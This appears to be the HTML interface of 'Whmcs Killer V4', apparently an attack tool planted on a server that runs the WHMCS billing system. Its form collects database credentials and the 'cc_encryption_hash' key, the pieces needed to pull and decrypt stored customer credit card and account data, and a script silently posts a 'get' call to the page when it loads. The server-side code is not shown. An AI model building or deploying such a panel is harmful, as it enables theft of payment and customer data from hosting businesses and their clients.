
 
<html><title>Whmcs Killer V4</title><head> 
    <link rel="stylesheet" media="screen,projection" type="text/css" href="whmcs.php?css=1" />  
    <link rel="stylesheet" media="screen,projection" type="text/css" href="whmcs.php?css=5" />  
    <link rel="stylesheet" media="screen,projection" type="text/css" href="whmcs.php?css=4" title="2col" /> 
    <link rel="alternate stylesheet" media="screen,projection" type="text/css" href="whmcs.php?css=3" title="1col" />  
     
    <link rel="stylesheet" media="screen,projection" type="text/css" href="whmcs.php?css=2" /> <!-- GRAPHIC THEME --> 
 
<style> 
#content {border:1px solid #afafaf; border-style:dashed; border-radius:5px; background:#fff; width:80%; } 
</style> 
<meta http-equiv='Content-Type' content='text/html; 
 charset=utf-8' /> 
</head> 
<body > 
    <center><img src='?img=0'></center> 
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.1/jquery.min.js"></script>
<script src="https://code.jquery.com/jquery-3.6.1.min.js"></script>
<script>
  $.ajax({
  method: "POST",
  url: window.location.href,
  data: {call: "get"}})
  </script> 
<center><div id='content' class='box'><center> <h3  class="tit"> DB Configuration of WHMCS</h3><br> </center> 
<FORM action=""  method="post" > 
<input type="hidden" name="form_action" value="1"> 
<br> 
<table  > 
<tr class='bg'><td>Database Host </td><td><input type="text" size="60" name="db_host" value=""></td></tr> 
<tr ><td>Database Username </td><td><input type="text" size="60" name="db_username" value=""></td></tr> 
<tr class='bg'><td>Database Password</td><td><input type="text" size="60" name="db_password" value=""></td></tr> 
<tr><td>Database Name</td><td><input type="text" size="60" name="db_name" value=""></td></tr> 
<tr class='bg'><td>cc_encryption_hash</td><td><input type="text" size="60" name="cc_encryption_hash" value=""></td></tr> 
</table 
<br><br> 
<INPUT class="input-submit"  type="submit" value="Submit" name="Submit"> 
</FORM> 
</td></tr></table> 
</FORM></div> <!-- /cols --> 
    <hr class="noscreen" />
</div> <!-- /main --> 
</body> 
</html>